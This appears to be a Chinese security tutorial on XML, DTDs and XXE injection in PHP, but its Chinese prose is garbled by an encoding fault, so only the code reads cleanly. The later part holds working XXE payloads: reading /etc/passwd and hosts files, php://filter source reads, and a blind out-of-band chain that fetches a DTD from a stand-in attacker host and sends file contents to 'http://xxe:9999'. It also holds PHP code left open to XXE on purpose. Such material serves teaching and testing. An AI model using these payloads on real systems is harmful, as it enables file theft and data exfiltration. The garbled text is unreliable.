çš„è§£ææ‰€æœ‰ç°ä»£æµè§ˆå™¨éƒ½æœ‰å†…å»ºçš„ XML è§£æå™¨ã€‚ XML è§£æå™¨æŠŠ XML æ–‡æ¡£è½¬æ¢ä¸º XML DOM å¯¹è±¡ - å¯é€šè¿‡ JavaScript æ“ä½œçš„å¯¹è±¡ã€‚ XML DOM : XML DOMï¼ˆXML Document Object Modelï¼‰å®šä¹‰äº†è®¿é—®å’Œæ“ä½œ XML æ–‡æ¡£çš„æ ‡å‡†æ–¹æ³•ï¼ŒæŠŠ XML æ–‡æ¡£ä½œä¸ºæ ‘ç»“æ„æ¥æŸ¥çœ‹ã€‚ é€šè¿‡ DOM æ ‘å¯ä»¥ è®¿é—® å’Œ ä¿®æ”¹æˆ–åˆ é™¤ å®ƒä»¬çš„å†…å®¹ï¼Œå¹¶ åˆ›å»ºæ–°çš„å…ƒç´ ã€‚ æœ‰ä¸¤ç§åŸºæœ¬çš„ XML è§£æå™¨ç±»å‹ï¼š åŸºäºæ ‘çš„è§£æå™¨ï¼šè¿™ç§è§£æå™¨æŠŠ XML æ–‡æ¡£è½¬æ¢ä¸ºæ ‘å‹ç»“æ„ã€‚å®ƒåˆ†ææ•´ç¯‡æ–‡æ¡£ï¼Œå¹¶æä¾›äº†å¯¹æ ‘ä¸­å…ƒç´ çš„è®¿é—®ï¼Œä¾‹å¦‚æ–‡æ¡£å¯¹è±¡æ¨¡å‹ (DOM)ã€‚ åŸºäºäº‹ä»¶çš„è§£æå™¨ï¼šå°† XML æ–‡æ¡£è§†ä¸ºä¸€ç³»åˆ—çš„äº‹ä»¶ã€‚å½“æŸä¸ªå…·ä½“çš„äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè§£æå™¨ä¼šè°ƒç”¨å‡½æ•°æ¥å¤„ç†ã€‚ DOM è§£æå™¨æ˜¯åŸºäºæ ‘çš„è§£æå™¨ã€‚ 1.8.1 PHP XML DOMå†…å»ºçš„ DOM è§£æå™¨ä½¿åœ¨ PHP ä¸­å¤„ç† XML æ–‡æ¡£æˆä¸ºå¯èƒ½ã€‚ ä¹Ÿå°±æ˜¯è¯´DOM XML è§£æå™¨å‡½æ•°æ˜¯ PHP æ ¸å¿ƒçš„ç»„æˆéƒ¨åˆ†ã€‚æ— éœ€å®‰è£…å°±å¯ä»¥ä½¿ç”¨è¿™äº›å‡½æ•°ã€‚ ç¤ºä¾‹ï¼š 1#xmlï¼š&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt; &lt;hair&gt;Black&lt;/hair&gt; &lt;country&gt;China&lt;/country&gt; &lt;eye&gt;big&lt;/eye&gt; &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt; 1#php:ç›´æ¥è¾“å‡º&lt;?php$xmlDoc = new DOMDocument();#åˆ›å»ºDOMDocumentå¯¹è±¡$xmlDoc-&gt;load(&quot;test.xml&quot;);#å°†test.xmlåŠ è½½è¿›å»print $xmlDoc-&gt;saveXML();#æŠŠå†…éƒ¨ XML æ–‡æ¡£æ”¾å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºè¾“å‡º?&gt; 1#php:éå† XML&lt;?php$xmlDoc = new DOMDocument();$xmlDoc-&gt;load(&quot;test.xml&quot;);$x = $xmlDoc-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123; print $item-&gt;nodeName . &quot; = &quot; . $item-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;?&gt; 1#php:SimpleXML&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);print_r($xml);?&gt; 1&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);echo $xml-&gt;hair . &quot;&lt;br&gt;&quot;;echo $xml-&gt;country . &quot;&lt;br&gt;&quot;;echo $xml-&gt;eye . &quot;&lt;br&gt;&quot;;echo $xml-&gt;body;?&gt; 1&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);echo $xml-&gt;getName() . &quot;&lt;br&gt;&quot;; foreach($xml-&gt;children() as $child)&#123; echo $child-&gt;getName() . &quot;: &quot; . $child . &quot;&lt;br&gt;&quot;;&#125;?&gt; XML DOM æ•™ç¨‹ 1.9 æ–‡æ¡£ç»“æ„ â€” æ ‘ç»“æ„ XMLå£°æ˜ DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ æ–‡æ¡£å…ƒç´  1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;note&gt; #æ ¹å…ƒç´ ï¼Œä¸å…¶å®ƒå…ƒç´ ä¹‹é—´æ˜¯ çˆ¶å­å…³ç³»;å„ä¸ªå­å…ƒç´ ä¹‹é—´ï¼šåŒèƒå…³ç³»&lt;to&gt;Tove&lt;/to&gt;#å››ä¸ªå­å…ƒç´ ï¼što,from,heading,body&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt; 1.9.1 XMLå£°æ˜1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;#XMLå£°æ˜: ç”¨äºå‘Šè¯‰æµè§ˆå™¨è¿™æ˜¯ä¸€ä¸ªxmlæ–‡æ¡£ï¼›å½“çœ‹åˆ°è¯¥å£°æ˜æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨è°ƒç”¨ xmlè§£é‡Šå™¨ è¿è¡Œè¯¥xmlæ–‡æ¡£#versionå±æ€§ï¼šç”¨äºè¯´æ˜å½“å‰xmlæ–‡æ¡£çš„ç‰ˆæœ¬ï¼Œå±æ€§å¿…é¡»#encodeingå±æ€§ï¼šç”¨äºè¯´æ˜å½“å‰xmlæ–‡æ¡£ä½¿ç”¨çš„å­—ç¬¦ç¼–ç é›†ï¼Œxmlè§£æå™¨ä¼šä½¿ç”¨è¿™ä¸ªç¼–ç æ¥è§£æxmlæ–‡æ¡£ï¼Œå±æ€§å¯é€‰ 1.9.2 DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰DTD(Document Type Definition) å³ æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—é‡Œé¢ å®šä¹‰äº†ç”¨æˆ·è‡ªå·±åˆ›å»ºçš„æ ¹å…ƒç´ ä»¥åŠå¯¹åº”çš„å­å…ƒç´ å’Œæ ¹å…ƒç´ çš„åˆæ³•å­å…ƒç´ å’Œå±æ€§ï¼Œé‚£ä¹ˆæ–‡æ¡£ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½å¿…é¡»ä»¥è¯¥DTDä¸ºæ¨¡æ¿, ç”¨äºå¯¹XMLçš„å…ƒç´ çš„å†…å®¹è¿›è¡Œç›¸åº”çš„è§„èŒƒåŒ–ã€‚ ä½œç”¨ï¼šéªŒè¯ä½ çš„XML æ ¼å¼ï¼šå®šä¹‰å…ƒç´  1&lt;!DOCTYPE note [&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]&gt; æ³¨ï¼šW3C æ”¯æŒä¸€ç§åŸºäº XML çš„ DTD ä»£æ›¿è€…ï¼Œå®ƒåä¸º XML Schema XML Schema èœé¸Ÿæ•™ç¨‹ ä½¿ç”¨ XML Schema æ”»å‡» å®šä¹‰å®ä½“ï¼š é™¤äº†åœ¨ DTD ä¸­å®šä¹‰ å…ƒç´ ï¼ˆå…¶å®å°±æ˜¯å¯¹åº” XML ä¸­çš„æ ‡ç­¾ï¼‰ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½åœ¨ DTD ä¸­ å®šä¹‰å®ä½“ (å¯¹åº”XML æ ‡ç­¾ä¸­çš„å†…å®¹) 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt; å®ä½“å¯ä»¥ä» å¤–éƒ¨çš„ dtd æ–‡ä»¶ ä¸­å¼•ç”¨ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;&lt;creds&gt; &lt;user&gt;&amp;xxe;&lt;/user&gt; &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;dtd:&lt;!ENTITY xxe SYSTEM &quot;file:///d://test1.txt&quot;&gt; å£°æ˜æ–¹å¼ å†…éƒ¨å£°æ˜ 1&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;#ä¾‹å¦‚&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt; å¤–éƒ¨å£°æ˜ 1&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt; 1#ä¾‹å¦‚ï¼š&lt;!DOCTYPE message SYSTEM &quot;message.dtd&quot;&gt;#message.dtd&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; äºŒã€DTD2.1 å…ƒç´ å£°æ˜ æ™®é€šå£°æ˜ 1&lt;!ELEMENT element-name category&gt;æˆ–&lt;!ELEMENT element-name (element-content)&gt; ç©ºå…ƒç´  1&lt;!ELEMENT element-name EMPTY&gt;å®ä¾‹:&lt;!ELEMENT br EMPTY&gt;XML example:&lt;br /&gt; PCDATAå…ƒç´  1&lt;!ELEMENT element-name (#PCDATA)&gt; å¸¦æœ‰ä»»ä½•å†…å®¹çš„å…ƒç´  1&lt;!ELEMENT element-name ANY&gt; å¸¦æœ‰å­å…ƒç´ çš„å£°æ˜ 1&lt;!ELEMENT element-name (child1)&gt;&lt;!ELEMENT element-name (child1,child2,...)&gt; 1ä¾‹å­ï¼šè¦æŒ‰é¡ºåº&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; åªå‡ºç°ä¸€æ¬¡çš„å…ƒç´  1&lt;!ELEMENT element-name (child-name)&gt; æœ€å°‘å‡ºç°ä¸€æ¬¡çš„å…ƒç´  1&lt;!ELEMENT element-name (child-name+)&gt; å‡ºç°é›¶æ¬¡æˆ–å¤šæ¬¡ 1&lt;!ELEMENT element-name (child-name*)&gt; å‡ºç°é›¶æ¬¡æˆ–ä¸€æ¬¡ 1&lt;!ELEMENT element-name (child-name?)&gt; å…¶å®ƒ 1&lt;!ELEMENT note (to,from,header,(message|body))&gt; &lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; 2.2 å±æ€§å£°æ˜1&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt; å±æ€§ç±»å‹ 2.3 å®ä½“å‰é¢äº†è§£åˆ°DTDæ˜¯ç”¨æ¥å®šä¹‰XMLæ–‡æ¡£å½“ä¸­çš„å…ƒç´ çš„ï¼Œç”¨äºè§„èŒƒä»–ä»¬ï¼Œå®é™…ä¸Šï¼Œå®ƒè¿˜ ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼ˆå³ å®ä½“ï¼‰ã€‚ å®ä½“å…¶å®å¯ä»¥çœ‹æˆä¸€ä¸ªå˜é‡ï¼Œåˆ°æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨ XML ä¸­é€šè¿‡ &amp; ç¬¦å·è¿›è¡Œå¼•ç”¨ã€‚ 2.3.1 æ™®é€šå®ä½“ å†…éƒ¨å£°æ˜ 1&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; 1#å®ä½“çš„å¼•ç”¨ï¼š&amp;ï¼Œå®ä½“åç§°ï¼Œåˆ†å· 1ä¾‹å­ï¼š&lt;!ENTITY day &quot;10&quot;&gt; XML:&lt;day&gt;&amp;day;&lt;/day&gt; å¤–éƒ¨å£°æ˜ 1&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt;&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;DTDæ ‡è¯†å&quot; &quot;å…¬ç”¨DTDçš„URI&quot;åŒºåˆ«: PUBLICæ˜¯æŒ‡å…¬ç”¨DTD,å…¶æ˜¯æŸä¸ªæƒå¨æœºæ„åˆ¶å®šï¼Œä¾›ç‰¹å®šè¡Œä¸šæˆ–å…¬å¸. SYSTEMæ˜¯æŒ‡è¯¥å¤–éƒ¨DTDæ–‡ä»¶æ˜¯ç§æœ‰çš„ï¼Œå³æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ï¼Œæ²¡æœ‰å…¬å¼€å‘è¡Œï¼Œåªæ˜¯ä¸ªäººæˆ–åœ¨å…¬å¸å†…éƒ¨æˆ–è€…å‡ ä¸ªåˆä½œå•ä½ä¹‹é—´ä½¿ç”¨. å…¬ç”¨DTDä½¿ç”¨PUBLICä»£æ›¿äº†åŸæ¥çš„SYSTEMï¼Œå¹¶å¢åŠ äº†DTDæ ‡è¯†åã€‚ 1ä¾‹å­ï¼štest1.dtd:&lt;!ENTITY test SYSTEM &quot;file:///d://test1.txt&quot;&gt;XMLï¼š&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test SYSTEM &quot;file:///d://test1.dtd&quot;&gt;&lt;author&gt;&amp;test;&lt;/author&gt; 2.3.2 å‚æ•°å®ä½“ä»…ä»…åœ¨DTDä¸­ä½¿ç”¨çš„è§£æå®ä½“ 1#å†…éƒ¨å£°æ˜: ENTITYå…³é”®å­—ã€ç™¾åˆ†å·ã€åç§°å’Œæ›¿æ¢å€¼&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å€¼&quot;&gt;#å¤–éƒ¨å£°æ˜&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;%å®ä½“å;#å®ä½“çš„å¼•ç”¨&lt;x&gt;%å®ä½“å;&lt;/x&gt; æ³¨ï¼š %ä¸¤è¾¹çš„ç©ºæ ¼ä¸èƒ½å°‘ å‚æ•°å®ä½“ä¸èƒ½åƒæ™®é€šå®ä½“é‚£æ ·åœ¨xmlæ–‡æ¡£å†…å®¹ä¸­è¿›è¡Œå¼•ç”¨ï¼Œå®ƒçš„å¼•ç”¨èŒƒå›´åªåœ¨ å½“å‰xmlæ–‡ä»¶çš„DTDå£°æ˜ ä¸­ï¼Œæˆ–è€…æ˜¯ å½“å‰çš„DTDæ–‡ä»¶ ä¸­ åœ¨DTDä¸­ï¼Œæ‰€æœ‰å‚æ•°å®ä½“å¿…é¡»åœ¨å¼•ç”¨ä¹‹å‰è¿›è¡Œå£°æ˜ å‚æ•°å®ä½“å¯¹ æ— å›æ˜¾XXE çš„åˆ©ç”¨ èµ·äº†è‡³å…³é‡è¦çš„ä½œç”¨ XML Schema èœé¸Ÿæ•™ç¨‹ ä¸‰ã€XXE**XML External Entity â€” XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ ** , å‘ç”Ÿåœ¨ åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ ï¼ˆ ä¸è¯¥é€‰é¡¹æœ‰å…³libxml_disable_entity_loader (false);ï¼‰ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶å’Œä»£ç ï¼Œé€ æˆä»»æ„æ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·Dosæ”»å‡» ç­‰å±å®³ã€‚ æ¦‚è¿°ï¼šæ”»å‡»è€…é€šè¿‡ å‘æœåŠ¡å™¨æ³¨å…¥æŒ‡å®šçš„xmlå®ä½“å†…å®¹ ï¼Œä»è€Œè®©æœåŠ¡å™¨æŒ‰ç…§æŒ‡å®šçš„é…ç½®è¿›è¡Œæ‰§è¡Œ,å¯¼è‡´é—®é¢˜ã€‚ä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯ æ¥æ”¶å’Œè§£æ äº†æ¥è‡ªç”¨æˆ·ç«¯çš„xmlæ•°æ®,è€Œåˆæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶,ä»è€Œå¯¼è‡´ xmlå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ äº§ç”Ÿç‚¹ï¼š æ–‡æ¡£ç±»å‹å®šä¹‰æ—¶ï¼Œå¯ä»¥å¼•ç”¨å¤–éƒ¨çš„ DTD æ–‡ä»¶ XMLè§£æå™¨è§£æå¤–éƒ¨å®ä½“æ—¶æ”¯æŒå¤šç§åè®®ï¼ˆfile :///, http:// ç­‰ï¼‰ åˆ©ç”¨ç‚¹ï¼š â€‹ é€šè¿‡æ„é€ æ¶æ„çš„å¤–éƒ¨å®ä½“ï¼Œå½“XMLè§£æå™¨è§£æäº†æˆ‘ä»¬æ‰€åŒ…å«çš„æ¶æ„å®ä½“æ—¶ä¾¿ä¼šè§¦å‘æ¼æ´ 1ç°åœ¨å¾ˆå¤šè¯­è¨€é‡Œé¢å¯¹åº”çš„è§£æxmlçš„å‡½æ•°é»˜è®¤æ˜¯ç¦æ­¢è§£æå¤–éƒ¨å®ä½“å†…å®¹çš„,ä»è€Œä¹Ÿå°±ç›´æ¥é¿å…äº†è¿™ä¸ªæ¼æ´ã€‚#ä»¥PHPä¸ºä¾‹,åœ¨PHPé‡Œé¢è§£æxmlç”¨çš„æ˜¯libxmlï¼Œå…¶åœ¨â‰¥2.9.0çš„ç‰ˆæœ¬ä¸­,é»˜è®¤æ˜¯ç¦æ­¢è§£æxmlå¤–éƒ¨å®ä½“å†…å®¹çš„ã€‚ å±å®³ æ–‡ä»¶è¯»å– RCEæ‰§è¡Œ å†…ç½‘æ”»å‡» Dosæ”»å‡» 3.1 åˆ©ç”¨3.1.1 æœ‰å›æ˜¾é€šè¿‡æ­£å¸¸çš„å›æ˜¾å°† å¤–éƒ¨å®ä½“ ä¸­çš„å†…å®¹è¯»å–å‡ºæ¥ æµ‹è¯•ï¼š1&lt;?php libxml_disable_entity_loader (false);//ç¦ç”¨åŠ è½½å¤–éƒ¨å®ä½“çš„åŠŸèƒ½ï¼Œç¦ç”¨ï¼ˆTRUEï¼‰æˆ–å¯ç”¨ï¼ˆFALSEï¼‰libxmlæ‰©å±•ï¼ˆå¦‚DOMï¼ŒXMLWriterå’ŒXMLReaderï¼‰æ¥åŠ è½½å¤–éƒ¨å®ä½“ $xmlfile = file_get_contents(&#x27;php://input&#x27;); $dom = new DOMDocument();//åˆ›å»ºä¸€ä¸ªDOMå¯¹è±¡ $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //åŠ è½½XML//LIBXML_NOENT æ›¿ä»£å®ä½“//LIBXML_DTDLOAD åŠ è½½å¤–éƒ¨å­é›† $creds = simplexml_import_dom($dom);//è¯¥å‡½æ•°æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡ echo $creds;?&gt; å¼•å…¥å†…éƒ¨å®ä½“ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts&quot;&gt; ]&gt; &lt;creds&gt;&amp;test;&lt;/creds&gt; å¼•å…¥å¤–éƒ¨å‚æ•°å®ä½“ â€”â€“ é¢˜ç›®å½“ä¸­ç»å¸¸ä½¿ç”¨çš„ä¸€ä¸ªç‚¹ 1&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt; %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt; 1hack.dtd&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///d://222.txt&quot;&gt; ]&gt; &lt;creds&gt;&amp;test;&lt;/creds&gt; å½“æ–‡ä»¶å†…å®¹å½“ä¸­åŒ…å« &lt; å’Œ &amp; ç¬¦å·æ—¶ï¼Œå°±ä¼šå‡ºç°æŠ¥é”™ php://filterä¹‹å‰æœ€å¸¸å‡ºé•œçš„åœ°æ–¹æ˜¯XXEã€‚ç”±äºXXEæ¼æ´çš„ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬åœ¨è¯»å–HTMLã€PHPç­‰æ–‡ä»¶æ—¶å¯èƒ½ä¼šæŠ›å‡ºæ­¤ç±»é”™è¯¯parser error : StartTag: invalid element name ã€‚å…¶åŸå› æ˜¯ï¼ŒPHPæ˜¯åŸºäºæ ‡ç­¾çš„è„šæœ¬è¯­è¨€ï¼Œ&lt;?php ... ?&gt;è¿™ä¸ªè¯­æ³•ä¹Ÿä¸XMLç›¸ç¬¦åˆï¼Œæ‰€ä»¥åœ¨è§£æXMLçš„æ—¶å€™ä¼šè¢«è¯¯è®¤ä¸ºæ˜¯XMLï¼Œè€Œå…¶ä¸­å†…å®¹ï¼ˆæ¯”å¦‚ç‰¹æ®Šå­—ç¬¦ï¼‰åˆæœ‰å¯èƒ½å’Œæ ‡å‡†XMLå†²çªï¼Œæ‰€ä»¥å¯¼è‡´äº†å‡ºé”™ã€‚ è§£å†³ï¼šä½¿ç”¨ CDATA æƒ³æ³•ä¸€ï¼š 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;file:///d:/222.txt&quot;&gt; ]&gt; &lt;creds&gt;&lt;![CDATA[&amp;test;]]&gt;&lt;/creds&gt;#é”™è¯¯ï¼šè¿™åªä¼šå°† &amp;test; åŸæ¨¡åŸæ ·çš„è¾“å‡º æƒ³æ³•äºŒï¼šç›´æ¥åœ¨ xmlå½“ä¸­è¿›è¡Œæ‹¼æ¥ â€”- æ™®é€šå®ä½“ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY end &quot;]]&gt;&quot;&gt;]&gt; &lt;creds&gt;&amp;start;&amp;test;&amp;end;&lt;/creds&gt;#ä¾æ—§æ˜¯å¤§é‡çš„æŠ¥é”™ æƒ³æ³•ä¸‰ï¼šå‚æ•°å®ä½“ åœ¨ å†…éƒ¨DTDæ‹¼æ¥ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY all &quot;%start;%test;%end;&quot;&gt;]&gt; &lt;creds&gt;&amp;all;&lt;/creds&gt;#ä»æ—§æœ‰æŠ¥é”™ æ ¹æ®XMLè§„èŒƒæ‰€æè¿°ï¼šâ€œåœ¨DTDå†…éƒ¨å­é›†ä¸­çš„å‚æ•°å®ä½“è°ƒç”¨ï¼Œä¸èƒ½æ··æºåˆ°æ ‡è®°è¯­ä¸­â€ ; ä¹Ÿå°±æ˜¯è¯´å‚æ•°å®ä½“ä¸èƒ½åœ¨å†…éƒ¨DTDä¸­è¿›è¡Œæ‹¼æ¥ï¼Œä½†æ˜¯XMLè§„èŒƒè¿˜å£°æ˜äº†ä¸€ç‚¹ï¼šâ€œå¤–éƒ¨å‚æ•°å®ä½“ä¸å—æ­¤é™åˆ¶â€ï¼Œè¿™å°±å‘Šè¯‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤–éƒ¨çš„DTDæ¥æ„é€ payloadï¼Œå°†æˆ‘ä»¬çš„CDATAå†…å®¹æ‹¼æ¥èµ·æ¥. æƒ³æ³•å››ï¼šä½¿ç”¨å¤–éƒ¨å‚æ•°å®ä½“ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % test SYSTEM &quot;file:///d:/222.txt&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;file:///d:/xxe.dtd&quot;&gt;%dtd; ]&gt;&lt;creds&gt;&amp;all;&lt;/creds&gt;xxe.dtd:&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%test;%end;&quot;&gt; å¯æˆåŠŸæ˜¾ç¤ºå‡º &amp; &lt; ç¬¦å· phpä¼ªåè®®é‚£ä¹ˆï¼Œä¸ºäº†è¯»å–åŒ…å«æœ‰æ•æ„Ÿä¿¡æ¯çš„PHPç­‰æºæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±è¦å…ˆå°†â€œå¯èƒ½å¼•å‘å†²çªçš„PHPä»£ç â€ç¼–ç ä¸€éï¼Œè¿™é‡Œå°±ä¼šç”¨åˆ°php://filterã€‚ php://filteræ˜¯PHPè¯­è¨€ä¸­ç‰¹æœ‰çš„åè®®æµ https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt; 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY test SYSTEM &quot;data://text/plain;base64,&quot;&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt; 3.1.2 æ— å›æ˜¾åˆ©ç”¨å‚æ•°å®ä½“å°†æœ¬åœ°æ–‡ä»¶å†…å®¹è¯»å‡ºæ¥åï¼Œä½œä¸ºURLä¸­çš„å‚æ•°å‘å…¶æŒ‡å®šçš„æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œç„¶ååœ¨å…¶æŒ‡å®šæœåŠ¡å™¨çš„æ—¥å¿—ä¸­è¯»å‡ºæ–‡ä»¶å†…å®¹ æµ‹è¯•1&lt;?phplibxml_disable_entity_loader (false);$xmlfile = file_get_contents(&#x27;php://input&#x27;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //æœªè¾“å‡º?&gt; Payload: 1&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt; 1xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999?p=%file;&#x27;&gt;&quot;&gt; æ—¥å¿—çš„è¯»å–/æ–‡ä»¶çš„æ¥æ”¶ä»£ç  æˆ–è€…æ˜¯ å¼€å¯ç«¯å£ç›‘å¬ å¼€å¯ç«¯å£ç›‘å¬ 1python2è¯­æ³•ï¼špython -m SimpleHTTPServer portpython3è¯­æ³•ï¼špython -m http.server port è¯´æ˜ï¼š æˆ‘ä»¬æ€»å…±è¿ç»­è°ƒç”¨äº†ä¸‰ä¸ªå‚æ•°å®ä½“ï¼Œ%test;%int;%send; é¦–å…ˆè°ƒç”¨%testå»è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„xxe2.dtdï¼Œç›¸å½“äºå°†xxe2.dtdåŒ…å«è¿›æ¥ï¼Œç„¶åè°ƒç”¨ 